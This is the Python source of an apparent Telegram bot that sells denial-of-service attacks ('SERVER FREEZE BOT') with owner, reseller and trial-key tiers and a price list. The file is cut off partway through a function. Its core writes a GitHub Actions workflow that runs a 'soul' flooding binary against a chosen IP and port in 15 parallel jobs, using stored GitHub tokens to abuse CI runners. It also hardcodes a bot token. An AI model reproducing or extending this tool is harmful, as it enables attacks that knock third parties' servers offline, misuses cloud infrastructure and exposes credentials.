import os,json,logging,threading,time,random,string,asyncio
from datetime import datetime,timedelta
from telegram import Update,InlineKeyboardButton,InlineKeyboardMarkup
from telegram.ext import Application,CommandHandler,ContextTypes,MessageHandler,filters,CallbackQueryHandler
from github import Github,GithubException
logging.basicConfig(format='%(asctime)s-%(name)s-%(levelname)s-%(message)s',level=logging.INFO)
logger=logging.getLogger(__name__)
BOT_TOKEN="8579474154:AAH16AmOzDPQGlCz14-D10PdZLWnrVTsssY"
YML_PATH=".github/workflows/main.yml"
BINARY="soul"
OWNER_IDS=[8101867786]
current_attack=None
attack_lock=threading.Lock()
cooldown_until=0
COOLDOWN=40
MAINTENANCE=False
MAX_ATTACKS=1000
user_counts={}
USER_PRICES={"1":120,"2":240,"3":360,"4":450,"7":650}
RESELLER_PRICES={"1":150,"2":250,"3":300,"4":400,"7":550}
SC_MAP={'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ғ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ','s':'s','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ','A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ғ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'ǫ','R':'ʀ','S':'s','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ'}
def sc(t):return ''.join(SC_MAP.get(c,c)for c in t)
def ld(f,d):
 try:
  with open(f,'r')as fi:return json.load(fi)or d
 except:return d
def sv(f,d):
 with open(f,'w')as fi:json.dump(d,fi,indent=2)
approved=ld('approved_users.json',{})
owners=ld('owners.json',{})
admins=ld('admins.json',{})
resellers=ld('resellers.json',{})
tokens=ld('github_tokens.json',[])
groups=ld('groups.json',{})
pending=ld('pending_users.json',[])
trial_keys=ld('trial_keys.json',{})
user_counts=ld('user_attack_counts.json',{})
if not owners:
 for oid in OWNER_IDS:owners[str(oid)]={"username":f"owner_{oid}","added_by":"system","added_date":time.strftime("%Y-%m-%d %H:%M:%S"),"is_primary":True}
 sv('owners.json',owners)
MAINTENANCE=ld('maintenance.json',{"maintenance":False}).get("maintenance",False)
COOLDOWN=ld('cooldown.json',{"cooldown":40}).get("cooldown",40)
MAX_ATTACKS=ld('max_attacks.json',{"max_attacks":1000}).get("max_attacks",1000)
AUTO_APPROVE=ld('auto_approve.json',{"enabled":False,"days":7}).get("enabled",False)
AUTO_APPROVE_DAYS=ld('auto_approve.json',{"enabled":False,"days":7}).get("days",7)
def is_owner(uid):return str(uid)in owners
def is_admin(uid):return str(uid)in admins
def is_reseller(uid):return str(uid)in resellers
def is_primary(uid):return owners.get(str(uid),{}).get('is_primary',False)
def is_approved(uid):
 uidstr=str(uid)
 if uidstr in approved:
  exp=approved[uidstr].get('expiry')
  if exp=="LIFETIME":return True
  if time.time()<exp:return True
  del approved[uidstr];sv('approved_users.json',approved)
 return False
def can_attack(uid):return(is_owner(uid)or is_admin(uid)or is_reseller(uid)or is_approved(uid))and not MAINTENANCE
def update_yml(token,repo,ip,port,tm):
 yml=f"""name: soul Attack
on: [push]
jobs:
  soul:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x soul
    - run: sudo ./soul {ip} {port} {tm}
"""
 try:
  g=Github(token);r=g.get_repo(repo)
  try:fc=r.get_contents(YML_PATH);r.update_file(YML_PATH,f"Update {ip}:{port}",yml,fc.sha)
  except:r.create_file(YML_PATH,f"Create {ip}:{port}",yml)
  return True
 except Exception as e:logger.error(f"Error: {e}");return False
def stop_jobs(token,repo):
 try:
  g=Github(token);r=g.get_repo(repo);total=0
  for st in['queued','in_progress','pending']:
   try:
    for w in r.get_workflow_runs(status=st):
     try:w.cancel();total+=1
     except:pass
   except:pass
  return total
 except:return 0
def gen_trial(hrs):
 key="TRL-"+"-".join([''.join(random.choices(string.ascii_uppercase+string.digits,k=4))for _ in range(3)])
 exp=time.time()+(hrs*3600);trial_keys[key]={"created":time.time(),"expiry":exp,"used":False,"hours":hrs}
 sv('trial_keys.json',trial_keys);return key
def redeem_trial(key,uid):
 if key not in trial_keys:return False,"Invalid key"
 if trial_keys[key]['used']:return False,"Key already used"
 if time.time()>trial_keys[key]['expiry']:return False,"Key expired"
 hrs=trial_keys[key]['hours'];exp=time.time()+(hrs*3600)
 approved[str(uid)]={"username":f"trial_{uid}","added_by":"trial_key","added_date":time.strftime("%Y-%m-%d %H:%M:%S"),"expiry":exp,"days":hrs/24}
 sv('approved_users.json',approved);trial_keys[key]['used']=True;trial_keys[key]['used_by']=uid;trial_keys[key]['used_date']=time.strftime("%Y-%m-%d %H:%M:%S")
 sv('trial_keys.json',trial_keys);return True,f"Trial access granted for {hrs} hours"
async def safe_edit(q,txt,kb=None,is_cb=True):
 try:
  if is_cb:await q.edit_message_text(txt,reply_markup=kb)
  else:await q.edit_text(txt,reply_markup=kb)
 except Exception as e:
  if"message is not modified"not in str(e).lower():
   logger.error(f"Error: {e}")
   try:
    if is_cb:await q.message.reply_text(txt,reply_markup=kb)
    else:await q.reply_text(txt,reply_markup=kb)
   except:pass
async def start(update:Update,context:ContextTypes.DEFAULT_TYPE):
 global current_attack,cooldown_until,AUTO_APPROVE,AUTO_APPROVE_DAYS
 user=update.effective_user;uid=user.id;fname=user.first_name;uname=user.username or"user"
 chat_type=update.effective_chat.type
 if chat_type in['group','supergroup']:
  cid=str(update.effective_chat.id)
  if cid not in groups:groups[cid]={"name":update.effective_chat.title,"added_date":time.strftime("%Y-%m-%d %H:%M:%S")};sv('groups.json',groups)
 if not can_attack(uid):
  user_exists=any(str(u['user_id'])==str(uid)for u in pending)
  if AUTO_APPROVE and not user_exists:
   exp=time.time()+(AUTO_APPROVE_DAYS*86400)
   approved[str(uid)]={"username":uname,"added_by":"auto_approve","added_date":time.strftime("%Y-%m-%d %H:%M:%S"),"expiry":exp,"days":AUTO_APPROVE_DAYS}
   sv('approved_users.json',approved)
   for oid in owners.keys():
    try:
     msg=f"╔═══════════════════════╗\n║  {sc('AUTO APPROVED')}  ║\n╚═══════════════════════╝\n\n┌─────────────────┐\n│ {sc('Name')}: {fname}\n│ {sc('Username')}: @{uname}\n│ {sc('Days')}: {AUTO_APPROVE_DAYS}\n└─────────────────┘"
     await context.bot.send_message(chat_id=int(oid),text=msg)
    except:pass
   txt=f"╔════════════════════════╗\n║  {sc('AUTO APPROVED')}  ║\n╚════════════════════════╝\n\n✅ {sc('You have been automatically approved')}\n⏱️ {sc('Access for')}: {AUTO_APPROVE_DAYS} {sc('days')}\n\n⬇️ {sc('Loading main menu')}..."
   if update.message:msg=await update.message.reply_text(txt);await asyncio.sleep(2);await msg.delete()
  elif not user_exists:
   pending.append({"user_id":uid,"username":uname,"request_date":time.strftime("%Y-%m-%d %H:%M:%S")});sv('pending_users.json',pending)
   for oid in owners.keys():
    try:
     msg=f"╔═══════════════════╗\n║  {sc('NEW ACCESS REQUEST')}  ║\n╚═══════════════════╝\n\n┌─────────────────┐\n│ {sc('Name')}: {fname}\n│ {sc('Username')}: @{uname}\n└─────────────────┘\n\nᴀᴘᴘʀᴏᴠᴇ: /add {uid} 7"
     await context.bot.send_message(chat_id=int(oid),text=msg)
    except:pass
   txt=f"╔════════════════════╗\n║  {sc('ACCESS DENIED')}  ║\n╚════════════════════╝\n\n⚠️ {sc('You dont have access to this bot')}\n\n📨 {sc('Your request has been sent to admin')}\n⏳ {sc('Please wait for approval')}"
   kb=[[InlineKeyboardButton(f"🔄 {sc('Refresh')}",callback_data="main_menu")]]
   if update.message:await update.message.reply_text(txt,reply_markup=InlineKeyboardMarkup(kb))
   else:await safe_edit(update.callback_query,txt,reply_markup=InlineKeyboardMarkup(kb))
   return
  else:
   txt=f"╔════════════════════╗\n║  {sc('ACCESS DENIED')}  ║\n╚════════════════════╝\n\n⚠️ {sc('You dont have access to this bot')}\n\n📨 {sc('Your request has been sent to admin')}\n⏳ {sc('Please wait for approval')}"
   kb=[[InlineKeyboardButton(f"🔄 {sc('Refresh')}",callback_data="main_menu")]]
   if update.message:await update.message.reply_text(txt,reply_markup=InlineKeyboardMarkup(kb))
   else:await safe_edit(update.callback_query,txt,reply_markup=InlineKeyboardMarkup(kb))
   return
 remaining=MAX_ATTACKS-user_counts.get(str(uid),0)
 if is_owner(uid):role="👑 ᴏᴡɴᴇʀ"
 elif is_admin(uid):role="⚡ ᴀᴅᴍɪɴ"
 elif is_reseller(uid):role="💎 ʀᴇsᴇʟʟᴇʀ"
 else:role="✨ ᴜsᴇʀ"
 status_emoji="🟢"if not MAINTENANCE else"🔴";status_text=sc("READY")if not MAINTENANCE else sc("MAINTENANCE")
 txt=f"╔════════════════════════╗\n║ 🔥 {sc('Remaining attacks')}: {remaining}/{MAX_ATTACKS} ║\n╚════════════════════════╝\n\n⚡ {sc('SERVER FREEZE BOT')}\n\n👋 {sc('Welcome')}, {fname}\n\n┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('YOUR INFO')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n├ 👤 {sc('Role')}: {role}\n├ 🎯 {sc('Attacks')}: {remaining}/{MAX_ATTACKS}\n└ 📡 {sc('Status')}: {status_emoji} {status_text}\n\n┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('QUICK ACTIONS')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛"
 kb=[]
 if not MAINTENANCE:kb.append([InlineKeyboardButton(f"⚔️ {sc('Attack Panel')}",callback_data="attack_panel")])
 if is_owner(uid):
  kb.append([InlineKeyboardButton(f"👥 {sc('Manage Users')}",callback_data="manage_users"),InlineKeyboardButton(f"🔧 {sc('Settings')}",callback_data="settings")])
  kb.append([InlineKeyboardButton(f"📊 {sc('Statistics')}",callback_data="stats"),InlineKeyboardButton(f"🔑 {sc('Servers')}",callback_data="servers")])
  kb.append([InlineKeyboardButton(f"🎫 {sc('Trial Keys')}",callback_data="trial_keys"),InlineKeyboardButton(f"👑 {sc('Admin Panel')}",callback_data="admin_panel")])
 elif is_admin(uid):kb.append([InlineKeyboardButton(f"👥 {sc('Manage Users')}",callback_data="manage_users"),InlineKeyboardButton(f"📊 {sc('Statistics')}",callback_data="stats")])
 elif is_reseller(uid):kb.append([InlineKeyboardButton(f"💰 {sc('Buy Access')}",callback_data="buy_access"),InlineKeyboardButton(f"📊 {sc('My Sales')}",callback_data="my_sales")])
 else:kb.append([InlineKeyboardButton(f"📱 {sc('My Access')}",callback_data="my_access"),InlineKeyboardButton(f"ℹ️ {sc('Help')}",callback_data="help")])
 kb.append([InlineKeyboardButton(f"📡 {sc('Status')}",callback_data="status")])
 kb.append([InlineKeyboardButton(f"🔄 {sc('Refresh')}",callback_data="main_menu")])
 if update.message:await update.message.reply_text(txt,reply_markup=InlineKeyboardMarkup(kb))
 else:await safe_edit(update.callback_query,txt,reply_markup=InlineKeyboardMarkup(kb))
async def show_attack_panel(q):
 global current_attack,cooldown_until
 uid=q.from_user.id;attack_status="🟢 ɴᴏ ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ";attack_info=""
 if current_attack:
  tleft=int(current_attack['end_time']-time.time())
  if tleft>0:
   attack_status="🔴 ᴀᴛᴛᴀᴄᴋ ɪɴ ᴘʀᴏɢʀᴇss"
   attack_info=f"\n\n┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('CURRENT ATTACK')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n├ 🎯 {sc('Target')}: {current_attack['ip']}:{current_attack['port']}\n├ ⏱️ {sc('Duration')}: {current_attack['time']}s\n├ ⏳ {sc('Time left')}: {tleft}s\n└ 👤 {sc('By')}: {current_attack.get('username','Unknown')}"
  else:current_attack=None
 cd_status="🟢 ʀᴇᴀᴅʏ";cd_info=""
 if time.time()<cooldown_until:cd_left=int(cooldown_until-time.time());cd_status="🔴 ᴄᴏᴏʟᴅᴏᴡɴ";cd_info=f"\n├ ⏳ {sc('Cooldown')}: {cd_left}s"
 txt=f"╔════════════════════════╗\n║  ⚔️ {sc('ATTACK PANEL')}  ║\n╚════════════════════════╝\n\n┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('SYSTEM STATUS')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n├ 📡 {sc('Attack')}: {attack_status}\n└ 🔄 {sc('Cooldown')}: {cd_status}{cd_info}{attack_info}\n\n┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('ATTACK OPTIONS')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n💡 {sc('Click below to launch attack')}"
 kb=[]
 if not current_attack and time.time()>=cooldown_until:kb.append([InlineKeyboardButton(f"🚀 {sc('Launch Attack')}",callback_data="launch_attack")])
 if current_attack:kb.append([InlineKeyboardButton(f"⏹️ {sc('Stop Attack')}",callback_data="stop_attack")])
 kb.append([InlineKeyboardButton(f"📊 {sc('Attack History')}",callback_data="attack_history"),InlineKeyboardButton(f"📋 {sc('Attack Logs')}",callback_data="attack_logs")])
 kb.append([InlineKeyboardButton(f"⚙️ {sc('Attack Settings')}",callback_data="attack_settings")])
 kb.append([InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="main_menu")])
 await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb))
async def launch_attack(q):
 uid=q.from_user.id
 txt=f"╔════════════════════════╗\n║  🚀 {sc('LAUNCH ATTACK')}  ║\n╚════════════════════════╝\n\n┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('ENTER DETAILS')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n\n📝 {sc('Please send attack details')}:\n\n{sc('Format')}: IP PORT TIME\n{sc('Example')}: 192.168.1.1 80 120\n\n💡 {sc('Send your attack command now')}"
 kb=[[InlineKeyboardButton(f"❌ {sc('Cancel')}",callback_data="attack_panel")]]
 await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb))
 if not hasattr(q.message.chat,'user_data'):q.message.chat.user_data={}
 q.message.chat.user_data['waiting_attack']=True
async def stop_attack_handler(q):
 global current_attack
 uid=q.from_user.id
 if not current_attack:
  txt=f"❌ {sc('No active attack to stop')}";kb=[[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="attack_panel")]]
  await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb));return
 if is_owner(uid)or is_admin(uid)or current_attack.get('user_id')==uid:
  stopped=0
  for tkn in tokens:
   if'token'in tkn and'repo'in tkn:stopped+=stop_jobs(tkn['token'],tkn['repo'])
  current_attack=None;cooldown_until=0
  txt=f"╔════════════════════════╗\n║  ⏹️ {sc('ATTACK STOPPED')}  ║\n╚════════════════════════╝\n\n✅ {sc('Attack stopped successfully')}\n📊 {sc('Jobs cancelled')}: {stopped}\n\n💡 {sc('You can launch new attack now')}"
  kb=[[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="attack_panel")]]
  await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb))
 else:
  txt=f"❌ {sc('You can only stop your own attacks')}";kb=[[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="attack_panel")]]
  await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb))
async def attack_history(q):
 uid=q.from_user.id;history=ld('attack_history.json',[])
 user_history=[h for h in history if h.get('user_id')==uid][-10:]if not(is_owner(uid)or is_admin(uid))else history[-10:]
 txt=f"╔════════════════════════╗\n║  📊 {sc('ATTACK HISTORY')}  ║\n╚════════════════════════╝\n\n"
 if user_history:
  txt+=f"┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('RECENT ATTACKS')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n"
  for i,h in enumerate(reversed(user_history),1):txt+=f"\n{i}. 🎯 {h['ip']}:{h['port']}\n├ ⏱️ {h['time']}s | 📅 {h.get('date','N/A')}\n└ 👤 {h.get('username','Unknown')}\n"
 else:txt+=f"❌ {sc('No attack history found')}\n"
 kb=[[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="attack_panel")]]
 await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb))
async def attack_logs(q):
 uid=q.from_user.id;logs=ld('attack_logs.json',[])
 user_logs=[l for l in logs if l.get('user_id')==uid][-15:]if not(is_owner(uid)or is_admin(uid))else logs[-15:]
 txt=f"╔════════════════════════╗\n║  📋 {sc('ATTACK LOGS')}  ║\n╚════════════════════════╝\n\n"
 if user_logs:
  txt+=f"┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('RECENT LOGS')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n"
  for l in reversed(user_logs):txt+=f"\n[{l.get('time','')}] {l.get('action','')} - {l.get('status','')}\n"
 else:txt+=f"❌ {sc('No logs found')}\n"
 kb=[[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="attack_panel")]]
 await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb))
async def attack_settings(q):
 uid=q.from_user.id
 if not(is_owner(uid)or is_admin(uid)):
  txt=f"❌ {sc('Access denied - Owner/Admin only')}";kb=[[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="attack_panel")]]
  await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb));return
 txt=f"╔════════════════════════╗\n║  ⚙️ {sc('ATTACK SETTINGS')}  ║\n╚════════════════════════╝\n\n┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('CURRENT SETTINGS')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n├ ⏳ {sc('Cooldown')}: {COOLDOWN}s\n├ 🎯 {sc('Max Attacks')}: {MAX_ATTACKS}\n└ 🔧 {sc('Maintenance')}: {'🔴 ON'if MAINTENANCE else'🟢 OFF'}\n\n💡 {sc('Select option to modify')}"
 kb=[[InlineKeyboardButton(f"⏳ {sc('Set Cooldown')}",callback_data="set_cooldown"),InlineKeyboardButton(f"🎯 {sc('Set Max Attacks')}",callback_data="set_max_attacks")],[InlineKeyboardButton(f"🔧 {sc('Toggle Maintenance')}",callback_data="toggle_maintenance")],[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="attack_panel")]]
 await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb))
async def manage_users(q):
 uid=q.from_user.id
 if not(is_owner(uid)or is_admin(uid)):
  txt=f"❌ {sc('Access denied')}";kb=[[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="main_menu")]]
  await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb));return
 total_users=len(approved);total_pending=len(pending)
 txt=f"╔════════════════════════╗\n║  👥 {sc('MANAGE USERS')}  ║\n╚════════════════════════╝\n\n┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('USER STATISTICS')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n├ ✅ {sc('Approved')}: {total_users}\n├ ⏳ {sc('Pending')}: {total_pending}\n├ 👑 {sc('Owners')}: {len(owners)}\n├ ⚡ {sc('Admins')}: {len(admins)}\n└ 💎 {sc('Resellers')}: {len(resellers)}\n\n💡 {sc('Select an option below')}"
 kb=[[InlineKeyboardButton(f"✅ {sc('Approved Users')}",callback_data="show_approved"),InlineKeyboardButton(f"⏳ {sc('Pending Users')}",callback_data="show_pending")],[InlineKeyboardButton(f"👑 {sc('Manage Owners')}",callback_data="manage_owners"),InlineKeyboardButton(f"⚡ {sc('Manage Admins')}",callback_data="manage_admins")],[InlineKeyboardButton(f"💎 {sc('Manage Resellers')}",callback_data="manage_resellers")],[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="main_menu")]]
 await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb))
async def show_approved(q):
 txt=f"╔════════════════════════╗\n║  ✅ {sc('APPROVED USERS')}  ║\n╚════════════════════════╝\n\n"
 if approved:
  txt+=f"┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('USER LIST')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n"
  for i,(uid,data)in enumerate(list(approved.items())[:20],1):
   exp=data.get('expiry','N/A')
   if exp=="LIFETIME":exp_str="∞"
   elif isinstance(exp,(int,float)):exp_str=f"{int((exp-time.time())/86400)}d"
   else:exp_str="N/A"
   txt+=f"\n{i}. 👤 {data.get('username','Unknown')}\n├ 🆔 {uid}\n└ ⏱️ {exp_str}\n"
 else:txt+=f"❌ {sc('No approved users')}\n"
 kb=[[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="manage_users")]]
 await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb))
async def show_pending(q):
 txt=f"╔════════════════════════╗\n║  ⏳ {sc('PENDING USERS')}  ║\n╚════════════════════════╝\n\n"
 if pending:
  txt+=f"┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('PENDING LIST')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n"
  for i,u in enumerate(pending[:20],1):txt+=f"\n{i}. 👤 {u.get('username','Unknown')}\n├ 🆔 {u['user_id']}\n├ 📅 {u.get('request_date','N/A')}\n└ ✅ /add {u['user_id']} 7\n"
 else:txt+=f"❌ {sc('No pending requests')}\n"
 kb=[[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="manage_users")]]
 await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb))
async def stats(q):
 uid=q.from_user.id
 if not(is_owner(uid)or is_admin(uid)):
  txt=f"❌ {sc('Access denied')}";kb=[[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="main_menu")]]
  await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb));return
 total_attacks=sum(user_counts.values());history=ld('attack_history.json',[])
 txt=f"╔════════════════════════╗\n║  📊 {sc('STATISTICS')}  ║\n╚════════════════════════╝\n\n┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('SYSTEM STATS')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n├ ✅ {sc('Total Users')}: {len(approved)}\n├ 👑 {sc('Owners')}: {len(owners)}\n├ ⚡ {sc('Admins')}: {len(admins)}\n├ 💎 {sc('Resellers')}: {len(resellers)}\n├ 🎯 {sc('Total Attacks')}: {total_attacks}\n├ 📋 {sc('Attack History')}: {len(history)}\n├ 🔑 {sc('Servers')}: {len(tokens)}\n└ 👥 {sc('Groups')}: {len(groups)}\n\n┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('SYSTEM STATUS')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n├ 🔧 {sc('Maintenance')}: {'🔴 ON'if MAINTENANCE else'🟢 OFF'}\n├ ⏳ {sc('Cooldown')}: {COOLDOWN}s\n├ 🎯 {sc('Max Attacks')}: {MAX_ATTACKS}\n└ 📡 {sc('Attack Running')}: {'🔴 YES'if current_attack else'🟢 NO'}"
 kb=[[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="main_menu")]]
 await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb))
async def servers(q):
 uid=q.from_user.id
 if not is_owner(uid):
  txt=f"❌ {sc('Access denied - Owner only')}";kb=[[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="main_menu")]]
  await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb));return
 txt=f"╔════════════════════════╗\n║  🔑 {sc('SERVERS')}  ║\n╚════════════════════════╝\n\n┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('SERVER LIST')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n"
 if tokens:
  for i,tkn in enumerate(tokens,1):txt+=f"\n{i}. 🔑 {tkn.get('repo','N/A')}\n├ 📝 {tkn.get('token','')[:10]}***\n└ 📅 {tkn.get('added_date','N/A')}\n"
 else:txt+=f"\n❌ {sc('No servers configured')}\n\n💡 {sc('Upload token file to add server')}"
 kb=[[InlineKeyboardButton(f"➕ {sc('Add Server')}",callback_data="add_server"),InlineKeyboardButton(f"🗑️ {sc('Remove Server')}",callback_data="remove_server")],[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="main_menu")]]
 await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb))
async def trial_keys_menu(q):
 uid=q.from_user.id
 if not is_owner(uid):
  txt=f"❌ {sc('Access denied - Owner only')}";kb=[[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="main_menu")]]
  await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb));return
 active=[k for k,v in trial_keys.items()if not v['used']and time.time()<v['expiry']]
 used=[k for k,v in trial_keys.items()if v['used']]
 expired=[k for k,v in trial_keys.items()if not v['used']and time.time()>=v['expiry']]
 txt=f"╔════════════════════════╗\n║  🎫 {sc('TRIAL KEYS')}  ║\n╚════════════════════════╝\n\n┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('KEY STATISTICS')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n├ ✅ {sc('Active')}: {len(active)}\n├ 🎯 {sc('Used')}: {len(used)}\n└ ⏰ {sc('Expired')}: {len(expired)}\n\n💡 {sc('Select an option below')}"
 kb=[[InlineKeyboardButton(f"➕ {sc('Generate Key')}",callback_data="generate_trial"),InlineKeyboardButton(f"📋 {sc('View Keys')}",callback_data="view_trial_keys")],[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="main_menu")]]
 await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb))
async def generate_trial_menu(q):
 txt=f"╔════════════════════════╗\n║  ➕ {sc('GENERATE KEY')}  ║\n╚════════════════════════╝\n\n💡 {sc('Select trial duration')}"
 kb=[[InlineKeyboardButton(f"⏰ 6 {sc('Hours')}",callback_data="gen_trial_6"),InlineKeyboardButton(f"⏰ 12 {sc('Hours')}",callback_data="gen_trial_12")],[InlineKeyboardButton(f"⏰ 24 {sc('Hours')}",callback_data="gen_trial_24"),InlineKeyboardButton(f"⏰ 48 {sc('Hours')}",callback_data="gen_trial_48")],[InlineKeyboardButton(f"⏰ 72 {sc('Hours')}",callback_data="gen_trial_72")],[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="trial_keys")]]
 await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb))
async def view_trial_keys(q):
 txt=f"╔════════════════════════╗\n║  📋 {sc('TRIAL KEYS')}  ║\n╚════════════════════════╝\n\n"
 if trial_keys:
  active=[k for k,v in trial_keys.items()if not v['used']and time.time()<v['expiry']]
  if active:
   txt+=f"┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('ACTIVE KEYS')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n"
   for k in active[:10]:
    v=trial_keys[k];hrs=v['hours'];exp_time=int((v['expiry']-time.time())/3600)
    txt+=f"\n🎫 {k}\n├ ⏰ {hrs}h | ⏳ {exp_time}h left\n└ 📅 {datetime.fromtimestamp(v['created']).strftime('%Y-%m-%d %H:%M')}\n"
  else:txt+=f"❌ {sc('No active keys')}\n"
 else:txt+=f"❌ {sc('No keys generated')}\n"
 kb=[[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="trial_keys")]]
 await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb))
async def admin_panel(q):
 uid=q.from_user.id
 if not is_owner(uid):
  txt=f"❌ {sc('Access denied - Owner only')}";kb=[[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="main_menu")]]
  await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb));return
 txt=f"╔════════════════════════╗\n║  👑 {sc('ADMIN PANEL')}  ║\n╚════════════════════════╝\n\n┏━━━━━━━━━━━━━━━━━━━┓\n┃  {sc('ADMIN OPTIONS')}  ┃\n┗━━━━━━━━━━━━━━━━━━━┛\n💡 {sc('Select an option below')}"
 kb=[[InlineKeyboardButton(f"👑 {sc('Manage Owners')}",callback_data="manage_owners"),InlineKeyboardButton(f"⚡ {sc('Manage Admins')}",callback_data="manage_admins")],[InlineKeyboardButton(f"💎 {sc('Manage Resellers')}",callback_data="manage_resellers")],[InlineKeyboardButton(f"📢 {sc('Broadcast')}",callback_data="broadcast"),InlineKeyboardButton(f"🔧 {sc('System Settings')}",callback_data="system_settings")],[InlineKeyboardButton(f"🔙 {sc('Back')}",callback_data="main_menu")]]
 await safe_edit(q,txt,reply_markup=InlineKeyboardMarkup(kb))
async def my_access(q):
 uid=q.from_user.id
 if is_owner(uid):role="👑 ᴏᴡɴᴇʀ";expiry="ʟɪғᴇᴛɪᴍᴇ"
 elif is_admin(uid):role="⚡ ᴀᴅᴍɪɴ";expiry="ʟɪғᴇᴛɪᴍᴇ"
 elif is_reseller(uid):role="💎 ʀᴇsᴇʟʟᴇʀ";expiry="ʟɪғᴇᴛɪᴍᴇ"
 elif is_approved(uid):
  role="✨ ᴜsᴇʀ";udata=approved.get(str(uid),{});exp=udata.get('expiry',0)
  if exp=="LIFETIME":expiry="ʟɪғᴇᴛɪᴍᴇ"
  else:dleft=int((exp-time.time())/86400);hleft=int(((exp-time.time())%86400)/3600);expiry=f"{dleft}ᴅ {hleft}ʜ"
 else:role="⏳ ᴘᴇɴᴅɪɴɢ";expiry="ᴡᴀɪᴛɪɴɢ"
 remaining=MAX_ATTACKS-user_counts.get(str(uid),0);status="🟢 ᴀᴄᴛɪᴠᴇ"if can_attack(uid)else"🔴 ɪɴᴀᴄᴛɪᴠᴇ"
